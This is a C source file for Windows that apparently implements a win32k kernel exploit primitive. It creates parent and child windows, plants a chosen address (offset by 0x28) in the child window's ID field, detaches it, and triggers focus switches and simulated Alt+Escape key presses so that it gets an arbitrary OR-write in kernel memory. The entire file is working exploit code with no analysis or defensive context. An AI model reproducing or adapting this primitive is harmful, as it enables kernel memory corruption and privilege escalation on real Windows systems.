#include <Windows.h>

#include "arbitrary_or.h"

HWND gParentWindow = 0;
HWND gChildWindow = 0;
HANDLE gCreatedWindowsEvent = 0;

int arbitraryOr4(unsigned long long address) {
	gCreatedWindowsEvent = CreateEventA(NULL, TRUE, FALSE, "CreateWindowsEvent");

	HANDLE thread = CreateThread(0, 0, windowLoop, &address, 0, 0);
	WaitForSingleObject(gCreatedWindowsEvent, INFINITE);
	WaitForSingleObject(thread, 1000);

	SwitchToThisWindow(gChildWindow, TRUE);
	SwitchToThisWindow(gParentWindow, TRUE);
	simulateAltEscape(2);

	return 0;
}

DWORD WINAPI windowLoop(LPVOID address) {
	unsigned long long targetAddress = 0;
	BOOL r = FALSE;
	MSG msg = { 0 };

	WNDCLASSEXA mockClass = { 0 };
	mockClass.cbSize = sizeof(WNDCLASSEXA);
	mockClass.lpfnWndProc = DefWindowProcA;
	mockClass.lpszClassName = "Mock";

	RegisterClassExA(&mockClass);

	gParentWindow = CreateWindowExA(0, "Mock", "Parent!", WS_VISIBLE, 0, 0, 500, 500, 0, 0, 0, 0);
	gChildWindow = CreateWindowExA(0, "Mock", "Child!", WS_VISIBLE | WS_CHILD | WS_OVERLAPPEDWINDOW,
		150, 150, 200, 200, gParentWindow, 0, 0, 0);

	targetAddress = *(unsigned long long*)address - 0x28;
	SetWindowLongPtrA(gChildWindow, GWLP_ID, targetAddress);

	SetParent(gChildWindow, 0);

	SetEvent(gCreatedWindowsEvent);

	// Window loop
	do {
		r = GetMessageA(&msg, 0, 0, 0);
		TranslateMessage(&msg);
		DispatchMessageA(&msg);
	} while (1);

	return 0;
}

void simulateAltEscape(unsigned int times) {
	unsigned int i = 0;

	keybd_event(VK_MENU, 0xB8, 0, 0);
	for (i = 0; i < times; ++i) {
		keybd_event(VK_ESCAPE, 0x81, 0, 0);
		keybd_event(VK_ESCAPE, 0x81, KEYEVENTF_KEYUP, 0);
	}
	keybd_event(VK_MENU, 0xB8, KEYEVENTF_KEYUP, 0);
}
